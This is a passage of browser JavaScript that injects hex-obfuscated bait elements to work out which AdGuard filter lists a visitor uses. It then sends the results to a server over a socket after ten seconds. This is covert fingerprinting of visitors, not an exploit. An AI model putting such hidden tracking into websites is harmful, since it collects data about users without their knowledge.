English",code:"a3",rules:[{type:0,body:'\x3c\x64\x69\x76\x20\x69\x64\x3d\x22\x5f\x5f\x42\x55\x4c\x4c\x45\x54\x49\x4e\x5f\x5f\x62\x64\x69\x76\x22\x20\x73\x74\x79\x6c\x65\x3d\x22\x70\x6f\x73\x69\x74\x69\x6f\x6e\x22\x3e\x3c\x2f\x64\x69\x76\x3e'}]},{name:"Adguard Mobile",code:"a3",rules:[{type:0,body:'\x3c\x69\x6d\x67\x20\x77\x69\x64\x74\x68\x3d\x22\x33\x32\x30\x22\x20\x68\x65\x69\x67\x68\x74\x3d\x22\x35\x30\x22\x3e'}]},{name:"Adguard Spyware",code:"a3",rules:[{type:1,body:'\x69\x64\x3d\x22\x71\x6f\x6f\x2d\x63\x6f\x75\x6e\x74\x65\x72\x22'}]},{name:"Adguard Annoyance",code:"a3",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x68\x73\x2d\x73\x6f\x73\x79\x61\x6c\x22'}]},{name:"Adguard Social media filter",code:"a3",rules:[{type:1,body:'\x69\x64\x3d\x22\x77\x70\x62\x66\x73\x62\x22'}]},{name:"Adguard Simplified domain names",code:"a3",rules:[{type:3,body:"\x65\x70\x69\x2e\x76\x6e"}]},{name:"Adguard Experimental",code:"a3",rules:[{type:2,body:"\x2f\x66\x62\x65\x76\x65\x6e\x74\x73\x2e\x6a\x73"}]},{name:"Adguard Russian",code:"ru",rules:[{type:1,body:'\x69\x64\x3d\x22\x4d\x45\x54\x41\x42\x41\x52\x5f\x49\x46\x52\x41\x4d\x45\x22'}]},{name:"Adguard Japan",code:"jp",rules:[{type:3,body:"\x66\x69\x76\x65\x63\x64\x6d\x2e\x63\x6f\x6d"}]},{name:"Adguard Spanish/Portuguese",code:"es",rules:[{type:1,body:'\x63\x6c\x61\x73\x73\x3d\x22\x62\x61\x6e\x6e\x65\x72\x42\x6f\x78\x22'}]},{name:"Adguard Turkish",code:"tr",rules:[{type:1,body:'\x69\x64\x3d\x22\x61\x6c\x74\x5f\x6b\x61\x79\x61\x6e\x5f\x72\x65\x6b\x6c\x61\x6d\x22'}]},{name:"Adguard German",code:"de",rules:[{type:2,body:"\x2f\x66\x61\x69\x62\x6c\x5f\x61\x64\x62\x6c\x6f\x63\x6b\x65\x72\x5f\x64\x65\x74\x65\x63\x74\x6f\x72\x2f"}]},{name:"Adguard Safari",code:"a3",rules:[{type:3,body:"\x76\x69\x70\x2e\x73\x63\x33\x38\x36\x2e\x63\x6f\x6d"}]}]}

function testAdblock() {
  var a = proxy_ab();
  $('#ab-load').show();
  for (var b = '', c = 0, d = 0, e = a.length; d < e; d++) {
    b += '<div id="n' + d + '">';
    for (var f = 0; f < a[d].rules.length; f++) if (0 == a[d].rules[f].type) b += a[d].rules[f].body;
     else if (1 == a[d].rules[f].type) b += '<img ' + a[d].rules[f].body + ' height="2" />';
     else if (2 == a[d].rules[f].type) b += '<img src="/img/1.gif?q' + a[d].rules[f].body + '"  height="2" />';
     else if (3 == a[d].rules[f].type) - 1 == a[d].rules[f].body.indexOf('/') ? a[d].rules[f].body += ':1/1.gif' : a[d].rules[f].body = a[d].rules[f].body.replace('/', ':1/'),
    b += '<img src="https://dummy.net.err.' + a[d].rules[f].body + '" height="2" />';
     else if (4 == a[d].rules[f].type) {
      var g = document.createElement('script');
      g.src = '/img/i/ab/' + c + '.js?' + a[d].rules[f].body + '?ts=' + (new Date).getTime(),
      document.getElementsByTagName('head') [0].appendChild(g),
      b += '<data><span class="n">ab' + c + '</span></data>',
      c++
    }
    b += '</div>'
  }
  $('#ab-rules').html(b),
  setTimeout(function () {
    for (var b, c = 0, d = 0, e = 0, f = a.length; e < f; e++) {
      b = 0;
      for (var g = 0; g < a[e].rules.length; g++) {
        if (a[e].rules[g].last_child && ' > :last-child', function (a) {
          var b = !1;
          return !a.css('-moz-binding') || - 1 == a.css('-moz-binding').indexOf('dummy') && - 1 == a.css('-moz-binding').indexOf('ab') ? a.is('img') ? (1 != a.height() && 'none' != a.css('display') || (b = 3), '0px 0px' == a.css('-o-transform-origin') && (b = 'opera'))  : 'none' == a.css('display') ? b = 2 : a.is('data') && void 0 === window[a.text()] ? b = 3 : null == a.parent().html() && (b = 3)  : b = 1,
          !!b && (d = b, !0)
        }($('#n' + e + ' :nth-child(' + (g + 1) + ')' + (a[e].rules[g].last_child ? ' > :last-child' : ''))) && (b++, a[e].rules[g].force)) {
          b = a[e].rules.length;
          break
        }
      }
      
      a[e].rules.length == b && (0 == c && final.adBlockLists.push(a[e].name))
    }
    $('#ab-rules').remove()
  }, 1024)
}

testAdblock()

setTimeout(()=>{ socket.emit('sending-info', final) }, 10000)
